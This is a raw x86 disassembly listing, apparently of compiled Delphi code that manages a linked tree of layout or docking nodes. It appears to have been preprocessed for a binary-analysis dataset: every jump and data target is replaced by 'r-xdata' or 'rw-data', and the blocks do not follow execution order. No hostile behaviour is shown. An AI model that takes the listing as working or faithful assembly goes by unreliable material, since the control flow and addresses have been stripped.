call sub_44b824
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_44b22c
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_44b260
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_44b2f0
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov edx 0x2
call sub_44b2f0
jmp r-xdata
retn
sub_44b2a8
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_44b35c
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov edx 0x2
call sub_44b35c
jmp r-xdata
retn
sub_44b2f0
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_44b724
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_44b35c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_44b210
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_44b724
push eax
mov eax esi
call sub_44b260
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_44b724
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_44b40c
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44b210
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_44b824
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_44b35c
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_44b210
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_44b35c
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_44b260
mov edx eax
add edx esi
mov eax ebx
call sub_44b74c
mov edx edi
mov eax ebx
call sub_44b74c
jmp r-xdata
mov eax ebx
call sub_44b5ac
mov eax ebx
call sub_44b7fc
mov ebx eax
test ebx ebx
jne r-xdata
sub_44b4b4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404008
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_40405c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
sub_44b4f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403430
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_44b569
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_4438b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_44b57c
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_44b7fc
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_44b5ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_44b35c
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44b35c
mov esi eax
push ebp
call sub_44b57c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44b7fc
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44b2f0
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_44b2f0
mov ecx ebx
pop edx
call sub_41905c
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_442578
mov eax [ ebp - 0x4 ]
call sub_44b724
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_44b724
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_44b724
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_44b724
push ebx
mov ebx eax
mov eax ebx
call sub_44b22c
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_44b1b4
test al al
je r-xdata
mov eax ebx
call sub_44b260
pop ebx
retn
sub_44b760
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b74c
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44b1fc
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_44b750
mov edx esi
call sub_44b760
sub_44b79c
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44b724
mov edi eax
mov eax ebx
call sub_44b260
cmp edi eax
jl r-xdata
mov eax esi
call sub_44b40c
mov eax [ esi + 0x1c ]
push eax
push sub_44d2ac
mov edx esi
call sub_44bad8
mov eax ebx
call sub_44b724
mov edi eax
mov eax esi
call sub_44b2a8
cmp edi eax
jle r-xdata
mov eax ebx
call sub_44b79c
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_44b808
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44b22c
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_44b830
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403204
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403558
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44b1d8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4240c8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42ae20
mov edx eax
mov eax ebx
call sub_424244
mov eax [ ebp - 0x4 ]
call sub_44ba00
xor eax eax
push ebp
push sub_44b93c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4460d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_44b40c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b943
mov eax [ ebp - 0x4 ]
call sub_44ba04
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_446094
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44b943
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_44d7d4
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_44b998
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_44ca04
mov eax [ esi + 0x10 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_44ba18
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_44ba18
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_44ba18
pop ecx
sub_44ba70
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_44ba18
pop ecx
sub_44ba9c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44ba9c
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44ba9c
pop ecx
sub_44baf0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_44ba70
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_44b35c
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_44b35c
push eax
mov edx 0x1
mov eax ebx
call sub_44b2f0
push eax
mov edx 0x2
mov eax ebx
call sub_44b2f0
pop edx
pop ecx
call sub_41905c
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402c40
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44bb74
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_44b5ac
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_41905c
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_442578
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44b1d8
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_44ba70
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_44b1fc
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_44ca9c
mov edx esi
mov eax ebx
call sub_44ba70
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_442b5c
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44b1d8
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_442b48
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_44b35c
mov edx eax
mov eax edi
call sub_44b74c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_44b35c
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_44b35c
mov edx eax
mov eax edi
call sub_44b74c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_44b35c
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_44bd84
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_44bf2c
jmp r-xdata
sub_44bd84
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44b1d8
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_44b724
mov edx eax
mov eax ebx
call sub_44b74c
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_44b74c
mov eax [ esi + 0x64 ]
call sub_44b724
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44cdf4
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44bad8
mov eax [ esi + 0x64 ]
call sub_44b724
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44cdf4
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44bad8
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_44d178
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44bad8
mov eax [ esi + 0x64 ]
call sub_44b724
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_44d2ac
xor edx edx
mov eax esi
call sub_44bad8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_44b74c
adc edx 0x0
mov eax ebx
call sub_44b40c
mov eax ebx
call sub_44b79c
push esi
push sub_44d2ac
xor edx edx
mov eax esi
call sub_44bad8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_44bf2c
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_44b40c
mov eax [ ebx + 0x14 ]
call sub_44b79c
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_44bfa4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_44b724
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_44b724
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_44b724
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_44b2f0
mov esi eax
mov edx 0x2
mov eax ebx
call sub_44b2f0
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_44b724
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_44b7fc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44b824
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44b7fc
call sub_44bfa4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44b824
call sub_44bfa4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_44b35c
add esi eax
mov eax [ ebp + 0x8 ]
